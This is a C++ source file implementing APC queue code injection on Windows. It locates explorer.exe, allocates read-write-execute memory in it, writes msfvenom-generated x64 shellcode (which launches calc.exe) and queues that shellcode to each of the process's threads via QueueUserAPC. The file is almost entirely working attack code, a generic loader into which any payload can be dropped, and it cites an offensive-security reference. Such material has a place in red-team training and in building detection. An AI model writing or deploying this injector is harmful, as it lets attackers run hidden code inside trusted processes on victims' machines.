/*
Title: APC Injection
Resources:
	- https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection#code
Warning: This technique is unstable that the shellcode can be executed. It may take several tries.
*/
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>

BOOL APCInjection() {
	WCHAR wTargetProcessName[] = L"explorer.exe"; // Replace it with a target process name.

	// The shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (!hSnapshot) return FALSE;

	// Find a target process.
	BOOL bFound = FALSE;
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (Process32First(hSnapshot, &processEntry)) {
		do {
			if (_wcsicmp(processEntry.szExeFile, wTargetProcessName) == 0) {
				bFound = TRUE;
				break;
			}
		} while (Process32Next(hSnapshot, &processEntry));
	}
	if (!bFound) {
		CloseHandle(hSnapshot);
		return FALSE;
	}

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!hProcess) {
		CloseHandle(hSnapshot);
		return FALSE;
	}

	LPVOID lpApcFunc = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpApcFunc) {
		CloseHandle(hSnapshot);
		CloseHandle(hProcess);
		return FALSE;
	}
	if (!WriteProcessMemory(hProcess, lpApcFunc, shellcode, sizeof(shellcode), nullptr)) {
		CloseHandle(hSnapshot);
		VirtualFreeEx(hProcess, lpApcFunc, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return FALSE;
	}

	// Get all thread IDs associated with the target process.
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	if (Thread32First(hSnapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(hSnapshot, &threadEntry));
	}

	HANDLE hThread = nullptr;
	for (DWORD dwThreadId : threadIds) {
		hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, dwThreadId);
		if (hThread) {
			QueueUserAPC((PAPCFUNC)lpApcFunc, hThread, 0);
		}
		SleepEx(1000 * 2, TRUE);
	}

	CloseHandle(hSnapshot);
	CloseHandle(hProcess);

	return TRUE;
}
